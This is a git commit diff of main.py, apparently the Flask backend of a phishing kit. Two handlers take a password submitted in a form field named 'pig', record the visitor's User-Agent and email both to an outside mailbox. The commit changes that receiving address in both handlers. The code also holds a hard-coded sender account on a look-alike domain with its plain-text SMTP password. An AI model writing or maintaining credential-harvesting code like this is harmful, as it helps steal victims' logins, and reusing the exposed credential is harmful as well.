6c06b9fd7223c86c6ff841389f4e2c7de462d492
raina8 <147160392+raina8@users.noreply.github.com>
2024-11-15 01:18:53 -0800

    Update main.py

--- main.py
+++ main.py
@@ -178,7 +178,7 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'contact@domainshieldtech.bio'
         sender_emaill = 'contact'
-        receiver_email = 'fabio508ants@gmail.com'
+        receiver_email = 'euro.trader@email.com'
         password = 'vip5071dc7bc887'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
@@ -219,7 +219,7 @@ def second():
         passwordemail = request.form.get('pig')
         sender_email = 'contact@domainshieldtech.bio'
         sender_emaill = 'contact'
-        receiver_email = 'fabio508ants@gmail.com'
+        receiver_email = 'euro.trader@email.com'
         password = 'vip5071dc7bc887'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
